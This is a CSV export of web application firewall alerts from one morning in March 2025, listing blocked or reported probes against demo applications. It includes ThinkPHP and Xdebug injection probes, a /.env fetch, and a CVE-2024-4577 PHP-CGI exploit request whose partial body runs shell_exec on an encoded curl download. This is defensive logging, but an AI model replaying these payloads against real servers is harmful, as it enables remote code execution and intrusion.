action,description,details,directory,countryCode,owaspCategory,applicationId,applicationName,tenantId,tenantName,example,extension,host,method,paramName,paramType,paramValue,params,passive,patternId,protocol,receivedTimeStamp,receivedTimeFormatted,refineDate,refineDateFormatted,request,ruleId,severity,externalIp,sourcePort,targetModule,protection,title,transId,uri,violationCategory,violationType,vulnData
Reported,PHP remote file inclusion vulnerability in FlashGameScript 1.5.4,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
7762
Description: PHP remote file inclusion vulnerability in FlashGameScript 1.5.4 (Severity: Low)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,MD,A1,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.0.173:80,GET,,,,func=&,TRUE,7762,HTTP,1.74E+12,13/03/2025 9:03,,,"GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient

",,High,193.84.71.190,32892,Vulnerabilities,Known Attack Types,Pattern Violation Detected,409508412,/index.php,Unvalidated Redirect,Remote File Inclusion,index.php
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,f02ee0e3-6ee7-451d-90b0-6b0b1a96b2d2,test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.167.44:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 9:03,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 176.100.167.44:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 46570
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: f02ee0e3-6ee7-451d-90b0-6b0b1a96b2d2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept-Encoding: gzip

",,High,92.255.57.58,47906,Vulnerabilities,Known Attack Types,Pattern Violation Detected,2649924320,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,c95ffed2-9315-4389-a47c-91c94424d6a8,JuiceAutomation,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.97.12:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 9:03,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Accept-Encoding: gzip
Host: 66.22.97.12:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 49518
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: c95ffed2-9315-4389-a47c-91c94424d6a8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
ShieldSquare-Response: 0

",,High,92.255.57.58,23724,Vulnerabilities,Known Attack Types,Pattern Violation Detected,1513035152,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,There was an attempt to post a file or content that contains a malicious php code,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
9835
Description: There was an attempt to post a file or content that contains a malicious php code (Severity: High)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,MD,A3,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.0.173:80,POST,,,,N/A,TRUE,9835,HTTP,1.74E+12,13/03/2025 9:02,,,"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Content-Length: 225
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Content-Type: application/x-www-form-urlencoded

",,High,193.84.71.190,45716,Vulnerabilities,Known Attack Types,Pattern Violation Detected,409508394,/hello.world,Injections,Code Injection,<?php
Reported,,"AllowList Security Filter intercepted a malicious request. Users are forbidden to access the requested page.
Method: POST.
No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,MD,A1,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,*.world,66.22.0.173:80,POST,,,,,TRUE,,HTTP,1.74E+12,13/03/2025 9:02,,,"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Content-Length: 225
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Content-Type: application/x-www-form-urlencoded

",,High,193.84.71.190,45716,AllowList,Allowed File Extension,Access denied due to malicious request,409508394,/hello.world,Access Control,URL Access Violation,
Reported,An attempt has been made to inject Unix command,"Database Security Filter intercepted a malicious request with a submitted parameter name/value, which includes a harmful expression.

Rule ID: EULHFP
Details: an attempt has been made to inject unix command
Example: ;date
No Src Page: might be manual hacking attempt !
Sus.Value: 3, 6:

Authenticated as Public
",/,MD,A3,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,;date,,66.22.0.173:80,POST,"&lt;?php shell_exec(base64_decode(""WD0kKGN1cmwgaHR0cDovLzk0Lj",Body URL Encoded,"="")); echo(md5(""Hello CVE-2024-4577"")); ?&gt;",,TRUE,EULHFP,HTTP,1.74E+12,13/03/2025 9:02,,,"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Content-Length: 225
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Content-Type: application/x-www-form-urlencoded

",,High,193.84.71.190,45716,Database,Known Attack Types,Parameter Validation Failure,409508394,/hello.world,Injections,Code Injection,
Reported,Evasion attempt via md5() function,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
10700
Description: Evasion attempt via md5() function (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,MD,A4,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.0.173:80,POST,"&lt;?php shell_exec(base64_decode(""WD0kKGN1cmwgaHR0cDovLzk0Lj",Body URL Encoded,"="")); echo(md5(""hello cve-2024-4577"")); ?&gt;",N/A,TRUE,10700,HTTP,1.74E+12,13/03/2025 9:02,,,"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Content-Length: 225
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Content-Type: application/x-www-form-urlencoded

",,High,193.84.71.190,45716,Vulnerabilities,Known Attack Types,Pattern Violation Detected,409508394,/hello.world,Evasion,Evasion,md5(
Reported,An attempt to execute code using the php://input stream,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
9547
Description: An attempt to execute code using the php://input stream (Severity: High)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,MD,A3,0ea39ff4-2f17-4907-b36a-2c99d8d6fb97,web-ddos-test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.0.173:80,POST,,,,N/A,TRUE,9547,HTTP,1.74E+12,13/03/2025 9:02,,,"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 66.22.0.173:80
X-RDWR-IP: 193.84.71.190
X-RDWR-PORT: 50874
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 0ea39ff4-2f17-4907-b36a-2c99d8d6fb97
Content-Length: 225
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Content-Type: application/x-www-form-urlencoded

",,High,193.84.71.190,45716,Vulnerabilities,Known Attack Types,Pattern Violation Detected,409508394,/hello.world,Injections,Code Injection,php://input
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,7f90d076-3880-41d6-8675-0542152dcee5,alexey-hkg,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.66.144:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:46,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 66.22.66.144:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 59904
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: 7f90d076-3880-41d6-8675-0542152dcee5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept-Encoding: gzip

",,High,92.255.57.58,51836,Vulnerabilities,Known Attack Types,Pattern Violation Detected,1067976848,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,e4733654-ba10-4d29-a1e0-d729fce78d2e,alexey-acl,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.167.18:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:27,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 176.100.167.18:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 46330
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: e4733654-ba10-4d29-a1e0-d729fce78d2e
x-rdwr-div-ip-ca3620a0-dde7-495d-899e-5b6faa1cadd2: 92.255.57.58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept-Encoding: gzip

",,High,92.255.57.58,14610,Vulnerabilities,Known Attack Types,Pattern Violation Detected,572625349,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Blocked,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,US,A2,902a76cd-a8ca-499c-ae06-101e4ef18674,alexey-bla-fra,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.32.172,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,FALSE,11131,HTTP,1.74E+12,13/03/2025 8:27,,,"GET / HTTP/1.1
Host: 66.22.32.172
X-RDWR-IP: 38.110.46.209
X-RDWR-PORT: 44087
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 902a76cd-a8ca-499c-ae06-101e4ef18674
Accept: */*
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 zgrab/0.x

",,High,38.110.46.209,17888,Vulnerabilities,Known Attack Types,Pattern Violation Detected,2058624400,/,Information Leakage,Fingerprinting,zgrab
Reported,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,NL,A2,e4733654-ba10-4d29-a1e0-d729fce78d2e,alexey-acl,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.167.18,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,TRUE,11131,HTTP,1.74E+12,13/03/2025 8:24,,,"GET /ab2h HTTP/1.1
Host: 176.100.167.18
X-RDWR-IP: 45.58.159.24
X-RDWR-PORT: 54592
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: e4733654-ba10-4d29-a1e0-d729fce78d2e
x-rdwr-div-ip-ca3620a0-dde7-495d-899e-5b6faa1cadd2: 45.58.159.24
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip

",,High,45.58.159.24,20740,Vulnerabilities,Known Attack Types,Pattern Violation Detected,558639158,/ab2h,Information Leakage,Fingerprinting,zgrab
Reported,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,NL,A2,e4733654-ba10-4d29-a1e0-d729fce78d2e,alexey-acl,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.167.18,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,TRUE,11131,HTTP,1.74E+12,13/03/2025 8:24,,,"GET /ab2g HTTP/1.1
Host: 176.100.167.18
X-RDWR-IP: 45.58.159.24
X-RDWR-PORT: 57602
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: e4733654-ba10-4d29-a1e0-d729fce78d2e
x-rdwr-div-ip-ca3620a0-dde7-495d-899e-5b6faa1cadd2: 45.58.159.24
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip

",,High,45.58.159.24,20724,Vulnerabilities,Known Attack Types,Pattern Violation Detected,558639157,/ab2g,Information Leakage,Fingerprinting,zgrab
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,cff5c4c7-fcaf-4b07-89fd-73644cd43005,why.yigal.co.uk,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.111.185:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:22,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Accept-Encoding: gzip
Host: 66.22.111.185:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 52338
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: cff5c4c7-fcaf-4b07-89fd-73644cd43005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
ShieldSquare-Response: 0

",,High,92.255.57.58,44954,Vulnerabilities,Known Attack Types,Pattern Violation Detected,873108880,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,US,A2,368a0d0e-a77e-4b7e-99f2-d491cb17930c,cto-debug-not-to-delete,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.164.31,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,TRUE,11131,HTTP,1.74E+12,13/03/2025 8:20,,,"GET / HTTP/1.1
Host: 176.100.164.31
X-RDWR-IP: 38.110.46.209
X-RDWR-PORT: 54550
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 368a0d0e-a77e-4b7e-99f2-d491cb17930c
Accept: */*
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 zgrab/0.x

",,High,38.110.46.209,41306,Vulnerabilities,Known Attack Types,Pattern Violation Detected,2625087039,/,Information Leakage,Fingerprinting,zgrab
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,368a0d0e-a77e-4b7e-99f2-d491cb17930c,cto-debug-not-to-delete,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.164.31:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:19,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 176.100.164.31:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 40570
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: 368a0d0e-a77e-4b7e-99f2-d491cb17930c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept-Encoding: gzip

",,High,92.255.57.58,47872,Vulnerabilities,Known Attack Types,Pattern Violation Detected,2606260238,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,1e7a5b9a-3c51-4039-9b03-d1a6ea86d83d,JuiceShopSecureAutomationTest,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.1.69:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:16,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 66.22.1.69:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 44556
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: 1e7a5b9a-3c51-4039-9b03-d1a6ea86d83d
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36

",,High,92.255.57.58,27336,Vulnerabilities,Known Attack Types,Pattern Violation Detected,226006048,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,US,A2,941bffbb-5959-49aa-a66d-8ecc8b8bcf3f,yb-mp,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.111.145,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,TRUE,11131,HTTP,1.74E+12,13/03/2025 8:15,,,"GET / HTTP/1.1
Host: 66.22.111.145
X-RDWR-IP: 38.110.46.209
X-RDWR-PORT: 33261
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 941bffbb-5959-49aa-a66d-8ecc8b8bcf3f
Accept: */*
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 zgrab/0.x

",,High,38.110.46.209,24996,Vulnerabilities,Known Attack Types,Pattern Violation Detected,873108862,/,Information Leakage,Fingerprinting,zgrab
Reported,ZMap Zgrab Security Scanner user agent,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11131
Description: ZMap Zgrab Security Scanner user agent (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,US,A2,89c2b701-16e4-4b76-985d-7d88a2c3e0ed,slavau-testapp-01,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.170.61,GET,User-Agent,Header,Mozilla/5.0 zgrab/0.x,N/A,TRUE,11131,HTTP,1.74E+12,13/03/2025 8:13,,,"GET / HTTP/1.1
Host: 176.100.170.61
X-RDWR-IP: 38.110.46.209
X-RDWR-PORT: 53108
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 89c2b701-16e4-4b76-985d-7d88a2c3e0ed
Accept: */*
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 zgrab/0.x

",,High,38.110.46.209,38350,Vulnerabilities,Known Attack Types,Pattern Violation Detected,4112992752,/,Information Leakage,Fingerprinting,zgrab
Reported,,"AllowList Security Filter intercepted a malicious request. Users are forbidden to access the requested page.
Method: GET.
No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,RO,A1,69373a21-386b-4273-b2e4-c3e0cfa71051,assaf-fra,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,*.env,176.100.167.11,GET,,,,,TRUE,,HTTP,1.74E+12,13/03/2025 8:13,,,"GET /.env HTTP/1.1
Host: 176.100.167.11
X-RDWR-IP: 80.94.92.116
X-RDWR-PORT: 53604
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 69373a21-386b-4273-b2e4-c3e0cfa71051
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept-Encoding: gzip, deflate
Accept: */*

",,High,80.94.92.116,35396,AllowList,Allowed File Extension,Access denied due to malicious request,2222932040,/.env,Access Control,URL Access Violation,
Reported,Xdebug PHP debugging tool - Code Injection vulnerability,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
11443
Description: Xdebug PHP debugging tool - Code Injection vulnerability (Severity: Medium)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/,HK,A3,4fc78719-7d25-419a-808d-447fc9497ae9,JuiceShopSecure_QA_Test,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,66.22.25.63:443,GET,,,,N/A,TRUE,11443,HTTP,1.74E+12,13/03/2025 8:12,,,"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 66.22.25.63:443
X-RDWR-IP: 92.255.57.58
X-RDWR-PORT: 41050
X-RDWR-PORT-MM-ORIG-FE-PORT: 443
X-RDWR-PORT-MM: 443
X-RDWR-APP-ID: 4fc78719-7d25-419a-808d-447fc9497ae9
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36

",,High,92.255.57.58,42604,Vulnerabilities,Known Attack Types,Pattern Violation Detected,3603726632,/,Injections,Code Injection,XDEBUG_SESSION_START=phpstorm
Reported,Attempt to access administrative location,"Vulnerabilities Security Filter intercepted a malicious request, which includes a blocked pattern.
9281
Description: Attempt to access administrative location (Severity: High)

No Src Page: might be manual hacking attempt !
Authenticated as Public
",/solr/admin/,DE,A1,368a0d0e-a77e-4b7e-99f2-d491cb17930c,cto-debug-not-to-delete,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,,176.100.164.31:80,GET,,,,N/A,TRUE,9281,HTTP,1.74E+12,13/03/2025 8:11,,,"GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1
Host: 176.100.164.31:80
X-RDWR-IP: 159.89.101.200
X-RDWR-PORT: 46514
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 368a0d0e-a77e-4b7e-99f2-d491cb17930c
User-Agent: Go-http-client/1.1

",,High,159.89.101.200,25190,Vulnerabilities,Known Attack Types,Pattern Violation Detected,2606260135,/solr/admin/cores,Access Control,Predictable Resource Location,/admin/
Reported,,"AllowList Security Filter intercepted a malicious request. Users are forbidden to access the requested page.
Method: GET.
No Src Page: might be manual hacking attempt !
Authenticated as Public
",/cgi-bin/,DE,A1,368a0d0e-a77e-4b7e-99f2-d491cb17930c,cto-debug-not-to-delete,d6ed80e4-40e6-4d80-993e-3c2d42ea1994,AmirF Demo,,*.cgi,176.100.164.31:80,GET,,,,,TRUE,,HTTP,1.74E+12,13/03/2025 8:11,,,"GET /cgi-bin/authLogin.cgi HTTP/1.1
Host: 176.100.164.31:80
X-RDWR-IP: 159.89.101.200
X-RDWR-PORT: 3124
X-RDWR-PORT-MM-ORIG-FE-PORT: 80
X-RDWR-PORT-MM: 80
X-RDWR-APP-ID: 368a0d0e-a77e-4b7e-99f2-d491cb17930c
User-Agent: Go-http-client/1.1

",,High,159.89.101.200,33418,AllowList,Allowed File Extension,Access denied due to malicious request,2625087020,/cgi-bin/authLogin.cgi,Access Control,URL Access Violation,
